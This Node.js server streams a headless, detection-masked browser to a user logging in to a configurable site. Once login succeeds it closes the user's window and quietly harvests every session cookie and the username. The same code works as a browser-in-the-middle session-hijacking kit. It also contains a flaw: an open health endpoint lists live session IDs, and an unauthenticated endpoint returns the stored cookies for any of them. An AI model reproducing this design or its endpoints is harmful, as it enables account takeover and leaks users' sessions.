#!/usr/bin/env node

/**
 * Streaming Cookie Extraction Server (Multi-Session)
 *
 * Launches isolated browser sessions for each user and streams the screen via WebSocket.
 * Each session has its own browser context, page, and CDP session for complete isolation.
 * Supports up to MAX_SESSIONS concurrent users per instance.
 *
 * URL-agnostic: configure via TARGET_URL, LOGIN_SUCCESS_PATTERNS, etc.
 * URL pattern: /?sessionId={uuid}
 */

const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const { chromium } = require("playwright-core");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");

// Load environment-specific config
const isDev = process.env.NODE_ENV === "development";
const envFile = isDev ? ".env.development" : ".env";
require("dotenv").config({ path: path.join(__dirname, "..", envFile) });

// Site configuration (URL-agnostic)
const siteConfig = require("../config/site");

console.log(`[streaming] Environment: ${isDev ? "DEVELOPMENT" : "PRODUCTION"}`);

// Configuration
const PORT = parseInt(process.env.STREAMING_PORT || "3002");
const TARGET_URL = process.env.TARGET_URL || siteConfig.target.url;
const TARGET_NAME = process.env.TARGET_NAME || siteConfig.target.name;
const MAX_SESSIONS = parseInt(process.env.MAX_SESSIONS || "3");
const SESSION_TIMEOUT_MS = 10 * 60 * 1000; // 10 minutes max session duration

// Initialize Express app
const app = express();

// Add CORS middleware for all routes
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  next();
});

const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
  },
  // Optimize for low latency
  pingInterval: 10000,
  pingTimeout: 5000,
  transports: ["websocket", "polling"],
  allowUpgrades: true,
  perMessageDeflate: false, // Disable compression for lower latency
});

// =============================================================================
// Session Management
// =============================================================================

/**
 * Session data structure
 * @typedef {Object} Session
 * @property {import('playwright-core').BrowserContext} browserContext
 * @property {import('playwright-core').Page} page
 * @property {any} cdpSession
 * @property {string} email
 * @property {number} createdAt
 * @property {boolean} extractionComplete
 * @property {boolean} isMobile
 * @property {string} currentStage
 * @property {NodeJS.Timeout|null} timeoutHandle
 * @property {any} cookieData - Extracted cookie data
 */

/** @type {Map<string, Session>} */
const sessions = new Map();

// Status stages for frontend feedback
const STATUS_STAGES = {
  CONNECTING: "connecting",
  BROWSER_LAUNCHING: "browser_launching",
  BROWSER_READY: "browser_ready",
  SCREENCAST_STARTING: "screencast_starting",
  NAVIGATING: "navigating",
  READY_FOR_LOGIN: "ready_for_login",
  LOGIN_DETECTED: "login_detected",
  EXTRACTING_COOKIES: "extracting_cookies",
  COMPLETE: "complete",
  ERROR: "error",
};

// Timeout constants
const TIMEOUTS = {
  BROWSER_LAUNCH: 15000, // 15 seconds
  SCREENCAST: 5000, // 5 seconds
  NAVIGATION: 60000, // 60 seconds (increased for slow fedauth responses)
};

/**
 * Emit status to a specific session's room
 */
function emitStatus(sessionId, stage, message, details = {}) {
  const session = sessions.get(sessionId);
  if (session) {
    session.currentStage = stage;
  }
  io.to(`session:${sessionId}`).emit("status", {
    stage,
    message,
    timestamp: Date.now(),
    ...details,
  });
  console.log(`[session:${sessionId}] Status: ${stage} - ${message}`);
}

/**
 * Get the number of active sessions
 */
function getActiveSessionCount() {
  return sessions.size;
}

/**
 * Check if we have capacity for a new session
 */
function hasCapacity() {
  return sessions.size < MAX_SESSIONS;
}

/**
 * Create a new isolated session with its own browser
 */
async function createSession(sessionId, isMobile = false) {
  if (sessions.has(sessionId)) {
    console.log(`[session:${sessionId}] Session already exists, reusing`);
    return sessions.get(sessionId);
  }

  if (!hasCapacity()) {
    throw new Error("Instance at capacity");
  }

  console.log(
    `[session:${sessionId}] Creating new session (mobile: ${isMobile})`,
  );
  emitStatus(
    sessionId,
    STATUS_STAGES.BROWSER_LAUNCHING,
    "Starting secure browser...",
  );

  // Launch browser with Playwright's bundled Chromium
  const launchOptions = {
    headless: true,
    args: [
      "--no-sandbox",
      "--disable-setuid-sandbox",
      "--disable-dev-shm-usage",
      "--disable-blink-features=AutomationControlled",
      "--disable-features=IsolateOrigins,site-per-process",
    ],
  };

  if (process.env.CHROME_PATH) {
    launchOptions.executablePath = process.env.CHROME_PATH;
  }

  // Browser launch with timeout
  let browser;
  try {
    const launchPromise = chromium.launch(launchOptions);
    const timeoutPromise = new Promise((_, reject) =>
      setTimeout(
        () => reject(new Error("Browser launch timeout")),
        TIMEOUTS.BROWSER_LAUNCH,
      ),
    );
    browser = await Promise.race([launchPromise, timeoutPromise]);
  } catch (launchErr) {
    emitStatus(sessionId, STATUS_STAGES.ERROR, "Failed to start browser", {
      suggestion:
        "The browser may not be installed. Try running: npx playwright install chromium",
    });
    throw launchErr;
  }

  emitStatus(
    sessionId,
    STATUS_STAGES.BROWSER_READY,
    "Browser started successfully",
  );

  // Create browser context - use mobile viewport if mobile client
  const viewport = isMobile
    ? { width: 390, height: 844 } // iPhone 14 Pro dimensions
    : { width: 1280, height: 720 };

  const userAgent = isMobile
    ? "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
    : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";

  console.log(
    `[session:${sessionId}] Using ${isMobile ? "mobile" : "desktop"} viewport: ${viewport.width}x${viewport.height}`,
  );

  const browserContext = await browser.newContext({
    viewport,
    userAgent,
    storageState: undefined,
    bypassCSP: false,
    ignoreHTTPSErrors: false,
    isMobile: isMobile,
    hasTouch: isMobile,
  });

  const page = await browserContext.newPage();

  // Enable CDP session for screencast
  emitStatus(
    sessionId,
    STATUS_STAGES.SCREENCAST_STARTING,
    "Preparing screen capture...",
  );

  const cdpSession = await page.context().newCDPSession(page);

  // Start screencast with timeout
  try {
    const screencastPromise = cdpSession.send("Page.startScreencast", {
      format: "jpeg",
      quality: isMobile ? 70 : 50, // Higher quality for mobile (smaller images)
      maxWidth: viewport.width,
      maxHeight: viewport.height,
      everyNthFrame: 1,
    });
    const timeoutPromise = new Promise((_, reject) =>
      setTimeout(
        () => reject(new Error("Screencast start timeout")),
        TIMEOUTS.SCREENCAST,
      ),
    );
    await Promise.race([screencastPromise, timeoutPromise]);
  } catch (screencastErr) {
    emitStatus(
      sessionId,
      STATUS_STAGES.ERROR,
      "Failed to start screen capture",
      {
        suggestion:
          "Please try again. If the problem persists, contact support.",
      },
    );
    await browserContext?.close();
    throw screencastErr;
  }

  console.log(`[session:${sessionId}] Screencast started`);

  // Listen for screencast frames - route to session's room only
  cdpSession.on("Page.screencastFrame", async (frame) => {
    io.to(`session:${sessionId}`).emit("frame", frame.data);
    await cdpSession.send("Page.screencastFrameAck", {
      sessionId: frame.sessionId,
    });
  });

  // Create session object
  const session = {
    browserContext,
    page,
    cdpSession,
    email: null,
    createdAt: Date.now(),
    extractionComplete: false,
    isMobile,
    currentStage: STATUS_STAGES.BROWSER_READY,
    timeoutHandle: null,
    cookieData: null,
  };

  // Set session timeout
  session.timeoutHandle = setTimeout(() => {
    console.log(
      `[session:${sessionId}] Session timed out after ${SESSION_TIMEOUT_MS / 1000}s`,
    );
    cleanupSession(sessionId);
  }, SESSION_TIMEOUT_MS);

  sessions.set(sessionId, session);

  // Navigate to target login page
  emitStatus(
    sessionId,
    STATUS_STAGES.NAVIGATING,
    `Loading ${TARGET_NAME} login page...`,
  );

  try {
    await page.goto(TARGET_URL, {
      waitUntil: "domcontentloaded",
      timeout: TIMEOUTS.NAVIGATION,
    });
  } catch (navErr) {
    emitStatus(sessionId, STATUS_STAGES.ERROR, `Failed to load ${TARGET_NAME}`, {
      suggestion: "Please check your network connection and try again.",
    });
    await cleanupSession(sessionId);
    throw navErr;
  }

  emitStatus(
    sessionId,
    STATUS_STAGES.READY_FOR_LOGIN,
    `Ready - please log in to ${TARGET_NAME}`,
  );

  // Start monitoring for login completion
  monitorLoginCompletion(sessionId);

  console.log(
    `[session:${sessionId}] Session created. Active sessions: ${sessions.size}/${MAX_SESSIONS}`,
  );

  return session;
}

/**
 * Get session by ID
 */
function getSession(sessionId) {
  return sessions.get(sessionId);
}

/**
 * Clean up and remove a session
 */
async function cleanupSession(sessionId) {
  const session = sessions.get(sessionId);
  if (!session) {
    console.log(`[session:${sessionId}] No session to cleanup`);
    return;
  }

  console.log(`[session:${sessionId}] Cleaning up session...`);

  // Clear timeout
  if (session.timeoutHandle) {
    clearTimeout(session.timeoutHandle);
  }

  // Stop screencast
  try {
    await session.cdpSession.send("Page.stopScreencast");
    console.log(`[session:${sessionId}] Screencast stopped`);
  } catch (err) {
    // Ignore - may already be closed
  }

  // Close browser context (this closes all pages)
  try {
    await session.browserContext.close();
    console.log(`[session:${sessionId}] Browser context closed`);
  } catch (err) {
    // Ignore - may already be closed
  }

  // Remove from Map
  sessions.delete(sessionId);

  console.log(
    `[session:${sessionId}] Session cleaned up. Active sessions: ${sessions.size}/${MAX_SESSIONS}`,
  );
}

/**
 * Extract cookies from a session's browser context
 *
 * Username extraction is configurable via site config:
 *  - POST_LOGIN_URL: navigate to a profile page after login
 *  - USERNAME_SELECTORS: CSS selectors to try for extracting the username
 */
async function extractCookies(sessionId) {
  const session = sessions.get(sessionId);
  if (!session || !session.browserContext) {
    throw new Error("Session or browser context not found");
  }

  const { browserContext, page } = session;
  const cookies = await browserContext.cookies();

  // Get username from page if possible (configurable via site config)
  let username = null;
  try {
    if (page) {
      await page.waitForTimeout(500);

      console.log(
        `[session:${sessionId}] Attempting to extract username...`,
      );

      // Navigate to profile page if configured
      if (siteConfig.postLogin.profileUrl) {
        try {
          await page.goto(siteConfig.postLogin.profileUrl, {
            waitUntil: "networkidle",
            timeout: 10000,
          });
          await page.waitForTimeout(1000);
        } catch (navErr) {
          console.log(
            `[session:${sessionId}] Could not navigate to profile URL: ${navErr.message}`,
          );
        }
      }

      // Try each configured username selector
      for (const selector of siteConfig.postLogin.usernameSelectors) {
        try {
          const el = await page.$(selector);
          if (el) {
            username = await el.evaluate((e) => e.value || e.textContent.trim());
            if (username) {
              console.log(
                `[session:${sessionId}] Extracted username via selector "${selector}": ${username}`,
              );
              break;
            }
          }
        } catch (selectorErr) {
          console.log(
            `[session:${sessionId}] Selector "${selector}" failed: ${selectorErr.message}`,
          );
        }
      }

      // Fallback: try page title
      if (!username) {
        try {
          const pageTitle = await page.title();
          console.log(`[session:${sessionId}] Page title: ${pageTitle}`);
        } catch {
          // ignore
        }
      }

      if (!username) {
        console.log(
          `[session:${sessionId}] Could not extract username - will need manual verification`,
        );
      }
    }
  } catch (err) {
    console.warn(
      `[session:${sessionId}] Error extracting username: ${err.message}`,
    );
  }

  // Create cookie data object (stored in session, not on disk)
  const cookieData = {
    username,
    cookies,
    metadata: {
      extractedAt: new Date().toISOString(),
      url: TARGET_URL,
      sessionId,
    },
  };

  // Store in session for later retrieval
  session.cookieData = cookieData;

  console.log(`[session:${sessionId}] Cookies extracted`);
  console.log(
    `[session:${sessionId}]    Username: ${username || "not extracted"}`,
  );
  console.log(`[session:${sessionId}]    Cookie count: ${cookies.length}`);

  return cookieData;
}

/**
 * Monitor page for login completion
 */
function monitorLoginCompletion(sessionId) {
  const session = sessions.get(sessionId);
  if (!session || !session.page) return;

  const { page } = session;

  console.log(`[session:${sessionId}] Monitoring for login completion...`);

  // Listen for URL changes
  page.on("framenavigated", async (frame) => {
    if (frame !== page.mainFrame()) return;

    const url = page.url();
    console.log(`[session:${sessionId}] Page navigated to: ${url}`);

    // Check if login is complete using configurable URL patterns
    const matchesSuccess = siteConfig.loginDetection.successPatterns.some((p) => url.includes(p));
    const matchesExclude = siteConfig.loginDetection.excludePatterns.some((p) => url.includes(p));

    if (matchesSuccess && !matchesExclude) {
      console.log(`[session:${sessionId}] Login complete! User reached ${TARGET_NAME}`);
      console.log(`[session:${sessionId}]    Current URL: ${url}`);

      // Emit login detected status
      emitStatus(sessionId, STATUS_STAGES.LOGIN_DETECTED, "Login successful!");

      // FIRST: Stop screencast to prevent any more frames being sent
      console.log(`[session:${sessionId}] Stopping screencast...`);
      try {
        await session.cdpSession.send("Page.stopScreencast");
        console.log(`[session:${sessionId}] Screencast stopped`);
      } catch (err) {
        console.log(
          `[session:${sessionId}] Could not stop screencast: ${err.message}`,
        );
      }

      // THEN: Tell frontend to close popup (after screencast is stopped)
      console.log(`[session:${sessionId}] Sending close-popup signal...`);
      io.to(`session:${sessionId}`).emit("close-popup");

      // Wait for popup to close before navigating to profile page
      await page.waitForTimeout(300);

      // Extract cookies HEADLESSLY (user won't see profile page navigation)
      try {
        console.log(
          `[session:${sessionId}] Extracting cookies and username headlessly...`,
        );
        const cookieData = await extractCookies(sessionId);

        console.log(`[session:${sessionId}] Cookie extraction completed`);

        // Emit completion status
        emitStatus(
          sessionId,
          STATUS_STAGES.COMPLETE,
          "Authentication complete!",
        );

        // Notify clients
        io.to(`session:${sessionId}`).emit("extraction-complete", {
          success: true,
          username: cookieData.username,
          cookieCount: cookieData.cookies.length,
        });

        console.log(
          `[session:${sessionId}] Notified clients of extraction completion`,
        );
        session.extractionComplete = true;

        // Schedule cleanup after delay to allow result fetch
        setTimeout(() => {
          cleanupSession(sessionId);
        }, 30000);
      } catch (err) {
        console.error(`[session:${sessionId}] Error extracting cookies:`, err);
        emitStatus(
          sessionId,
          STATUS_STAGES.ERROR,
          "Failed to save credentials",
          {
            suggestion: "Please try logging in again.",
          },
        );
        io.to(`session:${sessionId}`).emit("error", err.message);
      }
    }
  });
}

// =============================================================================
// Express Routes
// =============================================================================

/**
 * Generate the viewer HTML with sessionId embedded
 */
function getViewerHTML(sessionId) {
  return `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Streaming Login</title>
  <script src="/socket.io/socket.io.js"></script>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body {
      width: 100%;
      height: 100%;
      overflow: hidden;
      background: #fff;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    }
    #canvas {
      display: block;
      width: 100%;
      height: 100%;
      cursor: pointer;
      object-fit: contain;
    }
    .status-container {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      text-align: center;
      color: #666;
      max-width: 400px;
      padding: 40px;
    }
    .spinner {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #667eea;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .status-text {
      font-size: 16px;
      margin-bottom: 25px;
      color: #333;
    }
    .progress-steps {
      display: flex;
      justify-content: center;
      gap: 15px;
      margin-bottom: 20px;
    }
    .step {
      display: flex;
      flex-direction: column;
      align-items: center;
      opacity: 0.3;
      transition: opacity 0.3s, transform 0.3s;
    }
    .step.active { opacity: 1; transform: scale(1.1); }
    .step.complete { opacity: 1; }
    .step.complete .step-icon { background: #22c55e; }
    .step.error .step-icon { background: #dc2626; }
    .step-icon {
      width: 36px;
      height: 36px;
      border-radius: 50%;
      background: #667eea;
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: bold;
      font-size: 14px;
    }
    .step-label { font-size: 11px; margin-top: 6px; color: #666; }
    .error-container {
      background: #fef2f2;
      border: 1px solid #fca5a5;
      border-radius: 12px;
      padding: 25px;
      text-align: center;
    }
    .error-icon { font-size: 40px; margin-bottom: 15px; }
    .error-title { color: #dc2626; font-weight: 600; font-size: 18px; margin-bottom: 10px; }
    .error-message { color: #991b1b; font-size: 14px; margin-bottom: 8px; }
    .error-suggestion { color: #666; font-size: 13px; margin-bottom: 20px; }
    .retry-button {
      padding: 12px 24px;
      background: #667eea;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 14px;
      font-weight: 500;
      transition: background 0.2s;
    }
    .retry-button:hover { background: #5a67d8; }
    .hidden { display: none !important; }
  </style>
</head>
<body>
  <div class="status-container" id="status-container">
    <div class="spinner" id="spinner"></div>
    <p class="status-text" id="status-text">Connecting...</p>
    <div class="progress-steps" id="progress-steps">
      <div class="step" id="step-connect" data-step="connect">
        <span class="step-icon">1</span>
        <span class="step-label">Connect</span>
      </div>
      <div class="step" id="step-browser" data-step="browser">
        <span class="step-icon">2</span>
        <span class="step-label">Browser</span>
      </div>
      <div class="step" id="step-navigate" data-step="navigate">
        <span class="step-icon">3</span>
        <span class="step-label">Navigate</span>
      </div>
      <div class="step" id="step-login" data-step="login">
        <span class="step-icon">4</span>
        <span class="step-label">Login</span>
      </div>
    </div>
    <div class="error-container hidden" id="error-container">
      <div class="error-icon">⚠️</div>
      <p class="error-title" id="error-title">Something went wrong</p>
      <p class="error-message" id="error-message"></p>
      <p class="error-suggestion" id="error-suggestion"></p>
      <button class="retry-button" onclick="window.location.reload()">Try Again</button>
    </div>
  </div>
  <canvas id="canvas" class="hidden"></canvas>

  <script>
    // Session ID is embedded by the server
    const SESSION_ID = "${sessionId}";

    // Connect to Socket.IO with sessionId
    const socket = io({ query: { sessionId: SESSION_ID } });
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d', { alpha: false });
    const statusContainer = document.getElementById('status-container');
    const statusText = document.getElementById('status-text');
    const spinner = document.getElementById('spinner');
    const progressSteps = document.getElementById('progress-steps');
    const errorContainer = document.getElementById('error-container');
    const errorTitle = document.getElementById('error-title');
    const errorMessage = document.getElementById('error-message');
    const errorSuggestion = document.getElementById('error-suggestion');

    let isConnected = false;
    let canvasReady = false;
    let connectionTimeout = null;
    let loginDetected = false; // Flag to stop processing frames after login

    // Connection timeout - 10 seconds
    connectionTimeout = setTimeout(() => {
      if (!isConnected) {
        showError('Connection Timeout', 'Could not connect to the authentication server.', 'Please close this window and try again.');
      }
    }, 10000);

    socket.on('connect', () => {
      console.log('Connected to streaming server for session:', SESSION_ID);
      isConnected = true;
      clearTimeout(connectionTimeout);
      updateStep('connect', 'complete');
      statusText.textContent = 'Connected, starting browser...';
    });

    socket.on('disconnect', () => {
      console.log('Disconnected from server');
      if (!canvasReady && !errorContainer.classList.contains('hidden') === false) {
        showError('Connection Lost', 'Lost connection to the server.', 'Please close this window and try again.');
      }
    });

    socket.on('status', (data) => {
      console.log('Status:', data);
      statusText.textContent = data.message;

      switch(data.stage) {
        case 'browser_launching':
          updateStep('connect', 'complete');
          updateStep('browser', 'active');
          break;
        case 'browser_ready':
          updateStep('browser', 'complete');
          break;
        case 'screencast_starting':
        case 'navigating':
          updateStep('browser', 'complete');
          updateStep('navigate', 'active');
          break;
        case 'ready_for_login':
          updateStep('navigate', 'complete');
          updateStep('login', 'active');
          break;
        case 'login_detected':
        case 'extracting_cookies':
          // Close popup immediately - don't show any post-login content
          loginDetected = true;
          window.close();
          break;
        case 'complete':
          statusText.textContent = 'Complete! This window will close...';
          break;
        case 'error':
          showError('Error', data.message, data.suggestion || 'Please close this window and try again.');
          break;
      }
    });

    socket.on('frame', (data) => {
      // Stop processing frames after login is detected
      if (loginDetected) return;

      const img = new Image();
      img.onload = () => {
        // Double-check loginDetected in case it changed during image load
        if (loginDetected) return;

        canvas.width = img.width;
        canvas.height = img.height;
        ctx.drawImage(img, 0, 0);

        if (!canvasReady) {
          statusContainer.classList.add('hidden');
          canvas.classList.remove('hidden');
          canvasReady = true;
        }
      };
      img.src = 'data:image/jpeg;base64,' + data;
    });

    // Close popup immediately when server signals login detected
    socket.on('close-popup', () => {
      console.log('Received close-popup signal - closing immediately');
      loginDetected = true;
      window.close();
    });

    socket.on('extraction-complete', () => {
      // Close immediately (fallback in case status event was missed)
      loginDetected = true;
      window.close();
    });

    socket.on('error', (message) => {
      showError('Error', message, 'Please close this window and try again.');
    });

    function updateStep(stepName, state) {
      const stepEl = document.getElementById('step-' + stepName);
      if (!stepEl) return;
      stepEl.classList.remove('active', 'complete', 'error');
      if (state) stepEl.classList.add(state);
    }

    function showError(title, message, suggestion) {
      spinner.classList.add('hidden');
      statusText.classList.add('hidden');
      progressSteps.classList.add('hidden');
      errorContainer.classList.remove('hidden');
      errorTitle.textContent = title;
      errorMessage.textContent = message;
      errorSuggestion.textContent = suggestion || '';
    }

    // Mouse events
    canvas.addEventListener('mousemove', (e) => {
      if (!isConnected || !canvasReady) return;
      const rect = canvas.getBoundingClientRect();
      const scaleX = canvas.width / rect.width;
      const scaleY = canvas.height / rect.height;
      socket.emit('mouse-move', {
        x: Math.round((e.clientX - rect.left) * scaleX),
        y: Math.round((e.clientY - rect.top) * scaleY)
      });
    });

    canvas.addEventListener('mousedown', (e) => {
      if (!isConnected || !canvasReady) return;
      e.preventDefault();
      const rect = canvas.getBoundingClientRect();
      const scaleX = canvas.width / rect.width;
      const scaleY = canvas.height / rect.height;
      socket.emit('mouse-down', {
        x: Math.round((e.clientX - rect.left) * scaleX),
        y: Math.round((e.clientY - rect.top) * scaleY),
        button: e.button === 2 ? 'right' : 'left'
      });
    });

    canvas.addEventListener('mouseup', (e) => {
      if (!isConnected || !canvasReady) return;
      e.preventDefault();
      const rect = canvas.getBoundingClientRect();
      const scaleX = canvas.width / rect.width;
      const scaleY = canvas.height / rect.height;
      socket.emit('mouse-up', {
        x: Math.round((e.clientX - rect.left) * scaleX),
        y: Math.round((e.clientY - rect.top) * scaleY),
        button: e.button === 2 ? 'right' : 'left'
      });
    });

    canvas.addEventListener('click', (e) => {
      if (!isConnected || !canvasReady) return;
      e.preventDefault();
      const rect = canvas.getBoundingClientRect();
      const scaleX = canvas.width / rect.width;
      const scaleY = canvas.height / rect.height;
      socket.emit('mouse-click', {
        x: Math.round((e.clientX - rect.left) * scaleX),
        y: Math.round((e.clientY - rect.top) * scaleY),
        button: 'left'
      });
    });

    canvas.addEventListener('contextmenu', (e) => e.preventDefault());

    document.addEventListener('keydown', (e) => {
      if (!isConnected || !canvasReady) return;
      socket.emit('key-down', { key: e.key, code: e.code });
      if (e.key !== 'F5' && e.key !== 'F12') e.preventDefault();
    });

    document.addEventListener('keyup', (e) => {
      if (!isConnected || !canvasReady) return;
      socket.emit('key-up', { key: e.key, code: e.code });
    });

    document.addEventListener('input', (e) => {
      if (!isConnected || !canvasReady) return;
      const text = e.data || e.target.value;
      if (text) socket.emit('type-text', { text });
    });
  </script>
</body>
</html>
  `;
}

/**
 * Serve the streaming viewer HTML page (minimal UI, fullscreen)
 */
app.get("/", (req, res) => {
  const sessionId = req.query.sessionId;
  const isMobile = req.query.mobile === "1";

  // Require sessionId
  if (!sessionId) {
    return res.status(400).json({
      error: "sessionId required",
      message: "Please provide a sessionId query parameter",
    });
  }

  // Check capacity for new sessions
  if (!sessions.has(sessionId) && !hasCapacity()) {
    return res.status(503).json({
      error: "Instance at capacity",
      activeSessions: sessions.size,
      maxSessions: MAX_SESSIONS,
      message:
        "This instance is at capacity. Please wait or try another instance.",
    });
  }

  // If session doesn't exist, create it when Socket.IO connects
  // For now, just serve the viewer HTML
  if (isMobile) {
    console.log(`[session:${sessionId}] Mobile client detected`);
  }

  res.send(getViewerHTML(sessionId));
});

/**
 * Health check endpoint with session metrics
 */
app.get("/health", (req, res) => {
  res.json({
    status: "ok",
    port: PORT,
    activeSessions: sessions.size,
    maxSessions: MAX_SESSIONS,
    availableSlots: MAX_SESSIONS - sessions.size,
    sessions: Array.from(sessions.entries()).map(([id, session]) => ({
      id,
      createdAt: session.createdAt,
      extractionComplete: session.extractionComplete,
      stage: session.currentStage,
    })),
  });
});

/**
 * Extraction result endpoint (session-aware)
 */
app.get("/extraction-result/:sessionId", (req, res) => {
  const { sessionId } = req.params;

  const session = sessions.get(sessionId);

  // Check if session exists
  if (!session) {
    return res.json({
      success: false,
      error: "Session not found",
      requiresReauth: true,
    });
  }

  // Check if extraction is complete
  if (session.extractionComplete && session.cookieData) {
    console.log(`[session:${sessionId}] Extraction result fetched by frontend`);

    return res.json({
      success: true,
      username: session.cookieData.username || null,
      cookies: session.cookieData.cookies || [],
      extractedAt:
        session.cookieData.metadata?.extractedAt || new Date().toISOString(),
    });
  }

  // Extraction still in progress
  return res.json({
    success: false,
    pending: true,
    message:
      "Authentication in progress. Please complete login in the popup window.",
  });
});

/**
 * Legacy extraction result endpoint (for backwards compatibility)
 * Maps email-based requests to session-based
 */
app.get("/extraction-result-legacy/:email", (req, res) => {
  const { email } = req.params;

  // Find session by email (if we stored it)
  for (const [sessionId, session] of sessions.entries()) {
    if (
      session.email === email &&
      session.extractionComplete &&
      session.cookieData
    ) {
      return res.json({
        success: true,
        username: session.cookieData.username || null,
        cookies: session.cookieData.cookies || [],
        extractedAt:
          session.cookieData.metadata?.extractedAt || new Date().toISOString(),
      });
    }
  }

  // No matching session found
  return res.json({
    success: false,
    error: "No authentication session found",
    requiresReauth: true,
  });
});

// =============================================================================
// Socket.IO Connection Handler
// =============================================================================

io.on("connection", async (socket) => {
  const sessionId = socket.handshake.query.sessionId;

  if (!sessionId) {
    console.log(
      "[streaming] Client connected without sessionId - disconnecting",
    );
    socket.emit("error", "sessionId required");
    socket.disconnect();
    return;
  }

  console.log(`[session:${sessionId}] Client connected: ${socket.id}`);

  // Join session-specific room
  socket.join(`session:${sessionId}`);

  // Create session if first connection
  if (!sessions.has(sessionId)) {
    // Check capacity before creating
    if (!hasCapacity()) {
      socket.emit("error", "Instance at capacity. Please try again later.");
      socket.disconnect();
      return;
    }

    // Check if mobile from URL query (passed through from viewer HTML)
    const isMobile = socket.handshake.query.mobile === "1";

    try {
      await createSession(sessionId, isMobile);
    } catch (err) {
      console.error(`[session:${sessionId}] Failed to create session:`, err);
      socket.emit("error", err.message || "Failed to initialize browser");
      socket.disconnect();
      return;
    }
  }

  // Get session for input handlers
  const session = sessions.get(sessionId);

  // Route input events to this session's browser
  socket.on("mouse-move", async (data) => {
    const sess = sessions.get(sessionId);
    if (sess?.page) {
      await sess.page.mouse.move(data.x, data.y).catch((err) => {
        console.error(
          `[session:${sessionId}] Mouse move error: ${err.message}`,
        );
      });
    }
  });

  socket.on("mouse-down", async (data) => {
    const sess = sessions.get(sessionId);
    if (sess?.page) {
      await sess.page.mouse
        .down({ button: data.button === "right" ? "right" : "left" })
        .catch((err) => {
          console.error(
            `[session:${sessionId}] Mouse down error: ${err.message}`,
          );
        });
    }
  });

  socket.on("mouse-up", async (data) => {
    const sess = sessions.get(sessionId);
    if (sess?.page) {
      await sess.page.mouse
        .up({ button: data.button === "right" ? "right" : "left" })
        .catch((err) => {
          console.error(
            `[session:${sessionId}] Mouse up error: ${err.message}`,
          );
        });
    }
  });

  socket.on("mouse-click", async (data) => {
    const sess = sessions.get(sessionId);
    if (sess?.page) {
      await sess.page.mouse
        .click(data.x, data.y, {
          button: data.button === "right" ? "right" : "left",
        })
        .catch((err) => {
          console.error(
            `[session:${sessionId}] Mouse click error: ${err.message}`,
          );
        });
    }
  });

  socket.on("key-down", async (data) => {
    const sess = sessions.get(sessionId);
    if (sess?.page) {
      await sess.page.keyboard.down(data.key).catch((err) => {
        console.error(`[session:${sessionId}] Key down error: ${err.message}`);
      });
    }
  });

  socket.on("key-up", async (data) => {
    const sess = sessions.get(sessionId);
    if (sess?.page) {
      await sess.page.keyboard.up(data.key).catch((err) => {
        console.error(`[session:${sessionId}] Key up error: ${err.message}`);
      });
    }
  });

  socket.on("type-text", async (data) => {
    const sess = sessions.get(sessionId);
    if (sess?.page && data.text) {
      await sess.page.keyboard.type(data.text).catch((err) => {
        console.error(`[session:${sessionId}] Type text error: ${err.message}`);
      });
    }
  });

  socket.on("disconnect", () => {
    console.log(`[session:${sessionId}] Client disconnected: ${socket.id}`);

    // Check if any clients are still in this session's room
    const room = io.sockets.adapter.rooms.get(`session:${sessionId}`);
    if (!room || room.size === 0) {
      console.log(
        `[session:${sessionId}] No more clients, scheduling cleanup...`,
      );
      // Don't cleanup immediately - allow reconnection
      setTimeout(() => {
        const roomCheck = io.sockets.adapter.rooms.get(`session:${sessionId}`);
        if (!roomCheck || roomCheck.size === 0) {
          const sess = sessions.get(sessionId);
          // Only cleanup if extraction is complete or session is stale
          if (
            sess &&
            (sess.extractionComplete || Date.now() - sess.createdAt > 60000)
          ) {
            cleanupSession(sessionId);
          }
        }
      }, 5000);
    }
  });
});

// =============================================================================
// Server Startup
// =============================================================================

server.listen(PORT, "0.0.0.0", () => {
  console.log(`[streaming] Streaming server started on port ${PORT}`);
  console.log(`[streaming]    Max sessions: ${MAX_SESSIONS}`);
  console.log(
    `[streaming]    View at: http://localhost:${PORT}?sessionId=test`,
  );
  console.log(
    `[streaming]    Browser will start when first client connects for each session`,
  );
});

// Cleanup on exit
process.on("SIGINT", async () => {
  console.log("\n[streaming] Shutting down...");
  for (const sessionId of sessions.keys()) {
    await cleanupSession(sessionId);
  }
  process.exit(0);
});

process.on("SIGTERM", async () => {
  console.log("\n[streaming] Shutting down...");
  for (const sessionId of sessions.keys()) {
    await cleanupSession(sessionId);
  }
  process.exit(0);
});
